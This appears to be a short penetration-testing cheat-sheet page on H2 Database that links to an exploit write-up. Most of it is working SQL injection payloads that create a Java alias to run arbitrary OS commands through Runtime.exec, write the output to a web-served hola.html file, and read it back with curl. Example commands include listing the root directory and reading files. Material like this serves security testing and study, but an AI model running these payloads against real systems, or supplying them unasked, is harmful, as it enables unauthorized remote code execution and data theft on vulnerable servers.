# H2 Database (Java)

[https://www.exploit-db.com/exploits/49384](https://www.exploit-db.com/exploits/49384)

[https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2](https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2)

We could try to write an **alias** to a file on the webserver and then execute commands that will be retrieved on that file:

{% code overflow="wrap" fullWidth="true" %}
```sql
' or 1=0; CREATE ALIAS EXECVE AS ' String execve(String cmd) throws java.io.IOException { Process process = Runtime.getRuntime().exec(cmd); java.io.InputStream inputStream = process.getInputStream(); java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream("/app/target/classes/static/hola.html"); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = inputStream.read(buffer)) != -1) { fileOutputStream.write(buffer, 0, bytesRead); } fileOutputStream.close(); inputStream.close(); return "Output written to /app/target/classes/static/hola.html"; }'; -- - 


'; CREATE ALIAS EXECVE AS ' String execve(String cmd) throws java.io.IOException { Process process = Runtime.getRuntime().exec(cmd); java.io.InputStream inputStream = process.getInputStream(); java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream("/app/target/classes/static/hola.html"); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = inputStream.read(buffer)) != -1) { fileOutputStream.write(buffer, 0, bytesRead); } fileOutputStream.close(); inputStream.close(); return "Output written to /app/target/classes/static/hola.html"; }'; -- - 

# Now we can call that alias to run a command:
' or 1=0; CALL EXECVE('ls /'); -- -

'# We can retrieve the result by visiting that hola.html as example
curl -s http://$IP/hola.html

# We could issue other commands and visiting again the path to see the result
' or 1=0; CALL EXECVE('cat /tmp/file'); -- -
```
{% endcode %}
